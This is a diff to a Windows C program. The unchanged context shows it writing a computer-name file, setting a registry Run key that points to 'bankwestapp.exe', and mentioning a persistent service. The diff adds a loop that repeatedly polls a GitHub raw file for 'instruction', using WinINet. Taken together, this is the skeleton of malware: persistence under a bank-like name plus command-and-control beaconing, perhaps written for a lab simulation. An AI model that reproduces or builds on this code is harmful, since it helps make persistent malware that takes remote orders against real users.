@@ -4,6 +4,7 @@
 #include <wininet.h>
 #include <stdint.h>
 #include <winnt.h>
+#include <unistd.h>
 
 
 
@@ -36,7 +37,7 @@ int main()
     CloseHandle(hfile);
 
 //Create computer.txt content
-system("echo TESTPC > c:\\Users\\saurav\\Temp\\computer.txt");
+	system("echo SauravWindowsVi > c:\\Users\\saurav\\Temp\\computer.txt");
     
 //Set registry runkey Value - point to bankwestapp.exe
 
@@ -73,27 +74,47 @@ system("echo TESTPC > c:\\Users\\saurav\\Temp\\computer.txt");
 
 	//Create a persistent windows service. 
 
+	//Check for instruction
+	HINTERNET hInternet, hConnect, hRequest;
+    BOOL bResult;
+    DWORD dwBytesRead;
+    char buffer[4096];
+	int i;
+	
+	for (i = 0; i < 10; i++)
+	{
+		// Initialize WinINet
+		hInternet = InternetOpenA("HTTPGET", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+	  
+		// Connect to the server
+		hConnect = InternetConnectA(hInternet, "raw.githubusercontent.com", INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
+	  
 
-	/* Open Internet connection
-		HINTERNET hinternet_OpenA = InternetOpenA("LovetoConnect_Agent", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
-		if (hinternet == NULL)
-		{
-			printf("No connection\n");
-			
-		}
-		// Perform internet connection
-		HINTERNET hinterent_ConnectA = InternetConnectA(hinternet_OpenA, "github.com", INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
+		// Create an HTTP GET request
+		hRequest = HttpOpenRequestA(hConnect, "GET", "/lacouls/Public_download/refs/heads/main/checker.txt", NULL, NULL, NULL, 0, 0);
+	   
+
+		// Send the request
+		bResult = HttpSendRequestA(hRequest, NULL, 0, NULL, 0);
+
+
+		// Read the response
+		do {
+			bResult = InternetReadFile(hRequest, buffer, sizeof(buffer) - 1, &dwBytesRead);
+			if (bResult && dwBytesRead > 0) {
+				buffer[dwBytesRead] = '\0'; // Null-terminate the buffer
+				printf("%s", buffer);
+			}
+		} while (bResult && dwBytesRead > 0);
+		Sleep(3000);
+
+		// Clean up
+		InternetCloseHandle(hRequest);
+		InternetCloseHandle(hConnect);
+		InternetCloseHandle(hInternet);
 		
-		//Perform internet open URL
-		HINTERNET hinternet_OpenURL = InternetOpenURL(hinterent_ConnectA, 
-		
-		
-		
-	Write bytes to file.
-		DWORD bytesWritten;
-		BOOL wrfile;
-		wrfile = (hfile, internet_content, strlen(internet_content), &bytesWritten, NULL);
-	*/
+	}
+	
 
 	
 	return 0;
